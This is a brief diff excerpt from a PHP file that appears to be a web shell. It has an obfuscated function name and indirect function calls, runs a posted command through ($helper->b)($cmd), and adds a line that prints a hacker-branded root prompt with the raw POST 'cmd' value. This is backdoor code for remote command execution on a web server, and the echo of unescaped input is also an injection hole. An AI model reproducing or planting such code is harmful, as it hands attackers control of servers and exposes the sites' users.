@@ -1129,6 +1129,7 @@ function QiUyTbAgHk($s)
 			($helper->b)($cmd);
 
 			exit();
+			echo '<div class="container-fluid language-javascript"> <div class="shell mb-3"> <pre style="font-size:15px;"><font color="green">root@TokuHaxor:~</font>#&nbsp;<font color="red">'.$_POST['cmd'].'</font><br><code>';
 		}
 
 		$scandir = $func[21]($dir);
